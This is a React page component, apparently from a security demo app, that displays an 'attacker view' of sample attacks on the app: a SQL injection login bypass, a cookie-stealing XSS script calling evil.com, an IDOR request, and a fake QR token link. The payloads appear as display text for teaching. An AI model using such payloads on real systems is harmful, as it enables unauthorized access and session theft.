import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { useTranslation } from 'react-i18next';

const colorMap = {
  orange: { badge: 'bg-orange-900/40 border-orange-700/50 text-orange-400', code: 'text-orange-300' },
  yellow: { badge: 'bg-amber-900/40 border-amber-700/50 text-amber-400', code: 'text-amber-300' },
  red: { badge: 'bg-red-900/40 border-red-700/50 text-red-400', code: 'text-red-300' },
  purple: { badge: 'bg-purple-900/40 border-purple-700/50 text-purple-400', code: 'text-purple-300' },
  cyan: { badge: 'bg-cyan-900/40 border-cyan-700/50 text-cyan-400', code: 'text-cyan-300' },
};

export default function AttackerView() {
  const { t } = useTranslation();
  const [selected, setSelected] = useState(null);

  const ATTACKS = [
    {
      titleKey: 'attacker.sqliTitle',
      icon: '🗡️',
      descKey: 'attacker.sqliDesc',
      payload: `POST /api/auth/login\n{\n  "email": "admin' OR '1'='1 --",\n  "password": "anything"\n}`,
      resultKey: 'attacker.sqliResult',
      color: 'orange'
    },
    {
      titleKey: 'attacker.bruteTitle',
      icon: '🔨',
      descKey: 'attacker.bruteDesc',
      payloadKey: 'attacker.brutePayload',
      resultKey: 'attacker.bruteResult',
      color: 'yellow'
    },
    {
      titleKey: 'attacker.xssTitle',
      icon: '💀',
      descKey: 'attacker.xssDesc',
      payload: `상품 description:\n<script>fetch('//evil.com?c='+document.cookie)</script>`,
      resultKey: 'attacker.xssResult',
      color: 'red'
    },
    {
      titleKey: 'attacker.idorTitle',
      icon: '🚪',
      descKey: 'attacker.idorDesc',
      payload: `PUT /api/products/1\nAuthorization: Bearer <attacker_token>`,
      resultKey: 'attacker.idorResult',
      color: 'purple'
    },
    {
      titleKey: 'attacker.fakeqrTitle',
      icon: '🎭',
      descKey: 'attacker.fakeqrDesc',
      payload: `GET /product/1?token=FAKE_TOKEN_12345`,
      resultKey: 'attacker.fakeqrResult',
      color: 'cyan'
    },
  ];

  return (
    <div className="max-w-4xl mx-auto px-4 py-8">
      <div className="mb-6">
        <Link to="/" className="text-zinc-500 hover:text-zinc-300 text-sm">{t('attacker.backHome')}</Link>
      </div>

      <div className="text-center mb-10">
        <div className="text-5xl mb-4">☠️</div>
        <h1 className="text-3xl font-bold text-zinc-100 mb-2">{t('attacker.title')}</h1>
        <p className="text-zinc-400">{t('attacker.subtitle')}</p>
        <div className="mt-4 inline-flex items-center gap-2 bg-red-950/40 border border-red-800/50 rounded-full px-4 py-1.5 text-red-400 text-sm">
          {t('attacker.disclaimer')}
        </div>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-8">
        {ATTACKS.map((a, i) => {
          const c = colorMap[a.color];
          return (
            <button
              key={i}
              onClick={() => setSelected(selected === i ? null : i)}
              className={`card text-left transition-all hover:border-zinc-600 ${selected === i ? `border-${a.color}-700/70` : ''}`}
            >
              <div className="flex items-start gap-3">
                <span className="text-3xl">{a.icon}</span>
                <div className="flex-1">
                  <h3 className="font-bold text-zinc-100 mb-1">{t(a.titleKey)}</h3>
                  <p className="text-sm text-zinc-500">{t(a.descKey)}</p>
                  {selected === i && (
                    <div className="mt-4 space-y-3">
                      <div>
                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">{t('attacker.attackLabel')}</p>
                        <pre className={`text-xs font-mono whitespace-pre-wrap bg-zinc-800 rounded p-3 ${c.code}`}>
                          {a.payloadKey ? t(a.payloadKey) : a.payload}
                        </pre>
                      </div>
                      <div>
                        <p className="text-xs text-zinc-500 mb-1 uppercase tracking-wider">{t('attacker.resultLabel')}</p>
                        <div className={`text-sm font-semibold border rounded-lg px-3 py-2 ${c.badge}`}>{t(a.resultKey)}</div>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </button>
          );
        })}
      </div>

      {/* Try fake QR */}
      <div className="card border-red-700/30">
        <h3 className="font-semibold text-zinc-300 mb-2">{t('attacker.fakeQrTitle')}</h3>
        <p className="text-sm text-zinc-500 mb-4">{t('attacker.fakeQrDesc')}</p>
        <a
          href="/product/1?token=FAKE_TOKEN_12345"
          target="_blank"
          rel="noopener noreferrer"
          className="block bg-zinc-800 font-mono text-sm text-red-400 p-3 rounded-lg hover:bg-zinc-700 break-all transition-colors"
        >
          http://localhost:5173/product/1?token=FAKE_TOKEN_12345
        </a>
        <p className="text-xs text-zinc-600 mt-2">{t('attacker.fakeQrNote')}</p>
      </div>

      <div className="text-center mt-8">
        <Link to="/admin" className="btn-primary">{t('attacker.goAdmin')}</Link>
      </div>
    </div>
  );
}
